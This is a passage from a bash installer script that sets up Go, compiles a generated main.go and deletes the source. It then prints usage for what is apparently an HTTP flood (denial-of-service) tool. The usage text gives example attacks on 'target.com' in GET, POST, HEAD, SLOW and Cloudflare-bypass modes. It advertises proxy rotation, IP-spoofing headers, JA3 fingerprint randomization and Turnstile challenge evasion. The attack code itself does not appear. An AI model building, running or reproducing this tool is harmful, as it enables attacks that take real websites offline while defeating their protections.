    echo -e " ${GREEN}✓ main.go created successfully${NC}"
fi

echo

# Check OS and package manager
if [ -d "/data/data/com.termux" ]; then
    echo -e " ${YELLOW}➤${NC} ${GREEN}System detected:${NC} Termux"
    PKG_MGR="pkg"
elif command -v apt &> /dev/null; then
    echo -e " ${YELLOW}➤${NC} ${GREEN}System detected:${NC} Debian/Ubuntu"
    PKG_MGR="apt"
elif command -v pacman &> /dev/null; then
    echo -e " ${YELLOW}➤${NC} ${GREEN}System detected:${NC} Arch Linux"
    PKG_MGR="pacman -S"
elif command -v brew &> /dev/null; then
    echo -e " ${YELLOW}➤${NC} ${GREEN}System detected:${NC} macOS"
    PKG_MGR="brew"
else
    echo -e " ${YELLOW}➤${NC} ${YELLOW}Unknown OS, assuming Linux with apt${NC}"
    PKG_MGR="apt"
fi

echo

# Check and install Go
if ! command -v go &> /dev/null; then
    echo -e " ${YELLOW}➤${NC} ${GREEN}Installing Go...${NC}"
    case "$PKG_MGR" in
        "apt"|"pkg")
            $PKG_MGR update > /dev/null 2>&1
            $PKG_MGR install -y golang > /dev/null 2>&1
            ;;
        "pacman -S")
            pacman -S --noconfirm go > /dev/null 2>&1
            ;;
        "brew")
            brew install go > /dev/null 2>&1
            ;;
    esac
    
    if command -v go &> /dev/null; then
        echo -e " ${GREEN}✓ Go installed successfully${NC}"
    else
        echo -e " ${RED}✗ Failed to install Go${NC}"
        exit 1
    fi
else
    echo -e " ${GREEN}✓ Go already installed${NC}"
fi

echo

# Set Go environment
export GO111MODULE=on
export CGO_ENABLED=0

# Clean old module files
echo -e " ${YELLOW}➤${NC} ${GREEN}Cleaning old module files...${NC}"
rm -rf go.mod go.sum
echo -e " ${GREEN}✓ Cleanup complete${NC}"
echo

echo -e " ${YELLOW}➤${NC} ${GREEN}Initializing Go module...${NC}"
go mod init main > /dev/null 2>&1
echo -e " ${GREEN}✓ Module initialized${NC}"
echo

# Download dependencies
echo -e " ${YELLOW}➤${NC} ${GREEN}Downloading dependencies...${NC}"
go get golang.org/x/net@v0.24.0 > /dev/null 2>&1
echo -e " ${GREEN}✓ Dependencies downloaded${NC}"
echo

# Tidy up
echo -e " ${YELLOW}➤${NC} ${GREEN}Running go mod tidy...${NC}"
go mod tidy > /dev/null 2>&1
echo -e " ${GREEN}✓ Tidy complete${NC}"
echo

echo -e "${CYAN}${SEP}${NC}"
echo -e "${WHITE}  COMPILATION PROCESS${NC}"
echo -e "${CYAN}${SEP}${NC}"
echo

# Compile with optimizations
echo -e " ${YELLOW}➤${NC} ${GREEN}Compiling with optimizations...${NC}"
go build -ldflags="-s -w" -o main main.go

if [ $? -eq 0 ]; then
    chmod +x main
    echo -e " ${GREEN}✓ Compilation successful!${NC}"
    echo
    
    # Strip binary for smaller size
    if command -v strip &> /dev/null; then
        strip main 2>/dev/null
        echo -e " ${GREEN}✓ Binary optimized${NC}"
    fi
    
    # Cleanup
    echo -e " ${YELLOW}➤${NC} ${GREEN}Cleaning up...${NC}"
    rm -f main.go go.mod go.sum
    echo -e " ${GREEN}✓ Cleanup complete${NC}"        
    echo
    echo -e "${CYAN}${SEP}${NC}"
    echo -e "${WHITE}  SETUP COMPLETE - ADVANCED EDITION${NC}"
    echo -e "${CYAN}${SEP}${NC}"
    echo
    echo -e " ${GREEN}►${NC} Run: ${YELLOW}./main <target> <seconds> <GET|POST|HEAD|SLOW|CF> [proxy]${NC}"
    echo
    echo -e " ${GREEN}Examples:${NC}"
    echo -e "   ${YELLOW}./main https://target.com 60 GET${NC}"
    echo -e "   ${YELLOW}./main https://target.com 120 POST${NC}"
    echo -e "   ${YELLOW}./main https://target.com 30 HEAD${NC}"
    echo -e "   ${YELLOW}./main https://target.com 60 SLOW${NC}"
    echo -e "   ${YELLOW}./main https://target.com 60 CF${NC} ${WHITE}# Cloudflare bypass mode${NC}"
    echo -e "   ${YELLOW}./main https://target.com 60 GET proxy${NC}"
    echo
    echo -e " ${GREEN}Advanced Features:${NC}"
    echo -e "   • Cloudflare challenge solver (CF mode)"
    echo -e "   • Multiple proxy sources (3 APIs)"
    echo -e "   • JA3 fingerprint randomization"
    echo -e "   • Advanced IP spoofing (16+ headers)"
    echo -e "   • HTTP/2 & HTTP/1.1 support"
    echo -e "   • Automatic proxy rotation"
    echo -e "   • Browser fingerprint emulation"
    echo -e "   • Request randomization"
    echo -e "   • Challenge platform bypass"
    echo -e "   • Turnstile detection & handling"
    echo -e "   • Cookie persistence"
    echo -e "   • Randomized delays & patterns"
    echo -e "   • Multi-threaded optimization"
    echo
    echo -e " ${YELLOW}Note:${NC} CF mode includes advanced Cloudflare bypass techniques"
    echo -e "       including challenge solving and browser emulation"
    echo
    exit 0
else
    echo -e " ${RED}✗ Compilation failed${NC}"
    echo
    echo -e " ${YELLOW}➤${NC} ${GREEN}Try running these commands manually:${NC}"
    echo
    echo -e "   ${BLUE}1.${NC} go mod init main"
    echo -e "   ${BLUE}2.${NC} go get golang.org/x/net@v0.24.0"
    echo -e "   ${BLUE}3.${NC} go mod tidy"
    echo -e "   ${BLUE}4.${NC} go build -o main main.go"
    echo
    rm -f main.go
    exit 1
fi
